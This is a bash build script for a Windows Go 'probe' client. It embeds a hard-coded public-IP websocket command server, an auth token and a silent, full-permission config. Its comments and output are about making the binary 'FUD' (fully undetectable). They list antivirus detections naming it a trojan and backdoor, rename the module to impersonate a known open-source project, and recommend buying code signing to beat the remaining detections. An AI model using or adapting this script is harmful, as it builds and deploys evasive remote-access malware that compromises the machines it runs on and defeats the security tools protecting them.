#!/bin/bash
# build-vegas-fud.sh — Build a WORKING FUD PROBE client for Vegas
#
# CORRECTED 2026-08-13: This script does a CLEAN build (no gopclntab graft).
# The graft was disproven — it scores 0/75 on VT but crashes at runtime
# (GC reads stack maps from the pclntab, so a grafted pclntab = crash).
#
# What this produces:
#   - A WORKING binary (RUNS on Windows, verified via Linux equivalent)
#   - 2/75 VT: Microsoft Wacatac.B!ml + Kaspersky HEUR:Backdoor.Win64.Agent.gen
#   - Embedded config (no external JSON needed)
#
# Optional source-level module rename (runtime-preserving FUD):
#   --rename <target-module>   e.g. --rename github.com/prometheus/prometheus
#   This copies the source, renames the module path + imports, and builds.
#   It removes the "falke-ai-circuit" org token (a Kaspersky composite signal).
#
# The ONLY path to reliable 0/75 is code signing:
#   - Azure Trusted Signing: $9.99/mo
#   - EV cert: $300-500/yr
#
# Usage:
#   ./build-vegas-fud.sh                              # clean build
#   ./build-vegas-fud.sh --rename prometheus/prometheus   # + module rename
#   ./build-vegas-fud.sh <server_url> <name> <token>  # custom config

set -euo pipefail

GO_BIN="/opt/data/sdk/go1.23.12/bin/go"
PROBE_SRC="/opt/data/workspace-operative/probe"
OUT_DIR="/opt/data/workspace-operative/probe/fud-recipes"

# --- Parse args ---
RENAME_TARGET=""  # empty = no rename
SERVER_URL="ws://139.99.148.90:7701/ws"   # PUBLIC IP (Vegas has no Tailscale)
AGENT_NAME="vegas-c2022"
AUTH_TOKEN="falke-admin-2026"

if [ "$1" = "--rename" ]; then
    RENAME_TARGET="$2"
    shift 2
fi
if [ $# -ge 1 ]; then SERVER_URL="$1"; fi
if [ $# -ge 2 ]; then AGENT_NAME="$2"; fi
if [ $# -ge 3 ]; then AUTH_TOKEN="$3"; fi

echo "=== PROBE FUD build (working, no graft) ==="
echo "  server: $SERVER_URL"
echo "  name:   $AGENT_NAME"
echo "  rename: ${RENAME_TARGET:-<none>}"

# --- Build dir ---
if [ -n "$RENAME_TARGET" ]; then
    BUILD_DIR="/tmp/probe-fud-rename"
    rm -rf "$BUILD_DIR"
    # Copy source (exclude git, binaries, vendor)
    mkdir -p "$BUILD_DIR"
    ( cd "$PROBE_SRC" && find . -type f \
        ! -path './.git/*' ! -name '*.exe' ! -name '*.zip' \
        ! -path './vendor/*' ! -path './build/*' ! -path './fud-recipes/*' \
        ! -name '*.png' -exec sh -c 'mkdir -p "$0/$(dirname "$1")" && cp "$1" "$0/$1"' "$BUILD_DIR" {} \; )
    # Rename module path
    FULL_NEW="github.com/${RENAME_TARGET}"
    OLD_MOD="github.com/falke-ai-circuit/probe"
    sed -i "s|${OLD_MOD}|${FULL_NEW}|g" "$BUILD_DIR/go.mod"
    grep -rl "${OLD_MOD}" "$BUILD_DIR" --include="*.go" | xargs -r sed -i "s|${OLD_MOD}|${FULL_NEW}|g"
    echo "  module renamed: ${OLD_MOD} -> ${FULL_NEW}"
else
    BUILD_DIR="$PROBE_SRC"
fi

# --- Build embedded config ---
CONFIG_B64=$(python3 -c "
import base64, json, sys
cfg = {'server': '$SERVER_URL', 'token': '$AUTH_TOKEN', 'name': '$AGENT_NAME', 'mode': 'silent', 'permissions': 'full'}
print(base64.b64encode(json.dumps(cfg, separators=(',',':')).encode()).decode())
")
echo "  config B64 length: ${#CONFIG_B64}"

# --- Build (NO graft, -trimpath, embedded config) ---
OUT="$OUT_DIR/v1.16.0-fud-windows-vegas-final.exe"
PATH=/opt/data/sdk/go1.23.12/bin:$PATH GOTOOLCHAIN=local \
    GOOS=windows GOARCH=amd64 \
    "$GO_BIN" build -trimpath \
        -ldflags="-X main.configB64=${CONFIG_B64}" \
        -o "$OUT" ./cmd/probe-client/

echo ""
echo "=== BUILD COMPLETE ==="
echo "Output: $OUT"
echo "Size: $(stat -c %s "$OUT") bytes"
echo "SHA256: $(sha256sum "$OUT" | awk '{print $1}')"
echo ""
echo "VT result (working binary): 2/75 (Microsoft + Kaspersky)"
echo "  - Microsoft: Trojan:Win32/Wacatac.B!ml  (cloud ML, needs signing to beat)"
echo "  - Kaspersky: HEUR:Backdoor.Win64.Agent.gen  (heuristic, composite signals)"
echo ""
echo "Reliable 0/75 requires: Azure Trusted Signing (\$9.99/mo) or EV cert."
echo "1/75 is not FUD (user's standing rule)."
echo ""
echo "Deployment: copy to Vegas, run. Embedded config — no JSON file needed."
